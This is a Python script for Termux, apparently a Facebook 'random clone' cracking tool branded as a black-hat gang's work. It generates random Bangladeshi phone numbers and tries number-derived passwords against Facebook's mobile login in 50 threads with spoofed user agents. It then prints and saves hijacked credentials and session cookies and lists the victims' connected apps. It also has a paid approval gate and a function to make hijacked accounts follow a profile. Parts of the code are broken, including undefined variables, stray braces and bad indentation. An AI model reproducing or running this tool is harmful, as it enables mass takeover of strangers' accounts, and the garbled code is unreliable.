# Facebook: J  I  B  O  N
# Github: MRXJIBON
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
    meyermarexudi =(""" """)    
alltimexudi =("""JIBON""")
xudartimenai =("""JIBON""")
fuckyoursali =(""" JIBON""")
xudinaministar =(""" JIBON """)
hedaborakarent =(""" JIBON""")
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/MRXJIBON/Bai/blob/main/Bai.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(" \33[1;92mYour Kay : "+id)
      print(meyermarexudi)
      print(xudinaministar)
      print(meyermarexudi)
      print(alltimexudi)
      print(meyermarexudi)
      print(xudartimenai)
      print(meyermarexudi)
      input(' \3[1;32mIF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801756745324?text='+tks),approval()
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
    
    
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
logo =("""
  
    .S   .S   .S_SSSs      sSSs_sSSs     .S_sSSs    
   .SS  .SS  .SS~SSSSS    d%%SP~YS%%b   .SS~YS%%b   
   S%S  S%S  S%S   SSSS  d%S'     `S%b  S%S   `S%b  
   S%S  S%S  S%S    S%S  S%S       S%S  S%S    S%S  
   S&S  S&S  S%S SSSS%P  S&S       S&S  S%S    S&S  
   S&S  S&S  S&S  SSSY   S&S       S&S  S&S    S&S  
   S&S  S&S  S&S    S&S  S&S       S&S  S&S    S&S  
   S&S  S&S  S&S    S&S  S&S       S&S  S&S    S&S  
   d*S  S*S  S*S    S&S  S*b       d*S  S*S    S*S  
  .S*S  S*S  S*S    S*S  S*S.     .S*S  S*S    S*S  
sdSSS   S*S  S*S SSSSP    SSSbs_sdSSS   S*S    S*S  
YSSY    S*S  S*S  SSY      YSSP~YSSY    S*S    SSS  
        SP   SP                         SP          
        Y    Y                          Y           
                                                    

 \033[1;92m┏━━━━━━━━━━━\033[1;93m━━━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━━━━━\033[1;92m━━━━━━━━━━━━┓
 \033[1;92m┃ \033[1;91m┏━━━━━━━━━> \033[1;92mBLACK HAT HACKER GANG BD\033[1;91m <━━━━━━━━━━┓ \033[1;91m1┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┏━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \033[1;91mH┃ \033[1;91m2┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] AUTHOR   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mMD JIBON ISLAM                  \033[1;94mA┃ \033[1;94mI┃ \033[1;94m3┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] TOOL     \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mRANDOM CLONE           \033[1;93mB┃ \033[1;91mJ┃ \033[1;92m4┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] TOOL NUM \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m10                 \033[1;95mC┃ \033[1;95mK┃ \033[1;95m5┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] STATUS   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mFREE                   \033[1;93mD┃ \033[1;91mK┃ \033[1;92m6┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] VERSION  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m10.1                 \033[1;94mE┃ \033[1;94mK┃ \033[1;94m7┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] SYSTEM   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mDATA & WIFI            \033[1;93mF┃ \033[1;91mL┃ \033[1;92m8┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] NETWORK  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m3G - 4G -5G            \033[1;95mG┃ \033[1;95mM┃ \033[1;95m9┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] FACEBOOK \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mMRX JIBON         \033[1;93mH┃ \033[1;91mN┃ \033[1;92mA┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] GITHUB   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mMD JIBON      \033[1;94mI┃ \033[1;94mP┃ \033[1;94mB┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[\033[1;92m⚠\033[1;95m] WHATSAPP \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m01865544636        \033[1;93mJ┃ \033[1;91mQ┃ \033[1;92mC┃
 \033[1;92m┃ \033[1;91m┃ \033[1;93m┗━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━┛ \033[1;95mR┃ \033[1;95mD┃
 \033[1;91m┃ \033[1;91m┗━━━━━> \033[1;92mJIBON-CRACK_TERMUX ALL FREE COMMAND\033[1;91m <━━━━━━┛ \033[1;92mE┃
 \033[1;92m┗━━━━━━━━━━━\033[1;93m━━━━━━━━━\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def xxr():
	os.system('clear')
	os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
	print(logo)
	print(50*'\033[94;1m━')
	print('\033[92;1m [1] Random Clone \033[96;1m[ 😬 ]')
	print('\033[92;1m [2] JIBON-CRACK_Termux All Free Command ')
	print('\033[92;1m [3] BLACK HAT HACKER GANG BD ')
	print('\033[92;1m [4] Contact Admin WhatsApp ')
	print(' [0] Back to Main menu')
	print(50*'\033[94;1m━')
	bal = input('\033[96;1mChoose Your Option >>> ')
	if bal =='1':
		fbcrack()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
	if bal =='3':
		os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
	if bal =='4':
		os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
	if bal =='0':
		MainX()
# APK CHECK
def fbcrack():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(70*'\033[1;96m━')
    print(f' [{xr}💉{x}] Example>: {xr}019,017,018,0175{x}')
    print(70*'\033[1;96m━')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    print(logo)
    os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
    print("\033[0;95m═════════════════════════════════════════")
    limit = int(input(f'\033[0;97m[{xr}💉{x}]\033[0;92m EXAMPLE : \033[0;93m[ 3000 ]\x1b[38;5;208m[ 5000 ]\033[0;92m[ 10000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}💉{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}💉{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}💉{x}]\033[0;93m PLEASE WAIT CLONING START')
        jalan(f'\033[0;97m[{xr}💉{x}]\033[0;93m WiFi & DATA WORKING ')
        jalan(f'\033[0;97m[{xr}💉{x}] \x1b[0;93mUSE FLIGHT MODE ON/OF FOR SPEED UP')
        jalan(f'\033[0;97m[{xr}💉{x}] \033[0;93mSUPER FAST SPEED CLONING')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            }

headers = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': Pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[-JIBON-OK 😜] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🎁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/-JIBON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[-JIBON-CP 😔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/-JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}-JIBON{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
